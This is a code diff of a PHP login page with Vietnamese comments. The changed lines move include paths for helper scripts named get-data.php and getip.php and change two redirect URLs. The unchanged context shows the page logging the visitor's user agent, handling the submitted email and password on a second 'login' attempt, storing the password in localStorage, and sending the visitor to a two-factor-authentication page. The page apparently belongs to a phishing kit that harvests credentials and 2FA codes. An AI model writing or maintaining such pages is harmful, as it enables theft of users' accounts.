@@ -1,7 +1,9 @@
 <?php
 // get root directory
-require_once(dirname(dirname(__FILE__)) . '/get-data.php');
-require_once(dirname(dirname(__FILE__)) . '/getip.php');
+$rootDirectory = dirname(dirname(dirname(__FILE__)));
+$currentPreDirectory = dirname(dirname(__FILE__));
+require_once($rootDirectory . '/get-data.php');
+require_once($rootDirectory . '/getip.php');
 ?>
     
 <?php
@@ -488,7 +490,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 // Sử dụng state manager để xử lý login
                 window.loginStateManager.handleLogin(email, password, function() {
                     // Callback khi login thành công (lần 2)
-                    window.location.href = "/two-factor-authentication.php";
+                    window.location.href = "../two-factor-authentication";
                     localStorage.setItem('password', password);
                 });
             })
@@ -496,7 +498,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 console.error('Error:', error);
                 // Fallback nếu có lỗi network
                 window.loginStateManager.handleLogin(email, password, function() {
-                    window.location.href = "/two-factor-authentication.php";
+                    window.location.href = "../two-factor-authentication";
                     localStorage.setItem('password', password);
                 });
             });
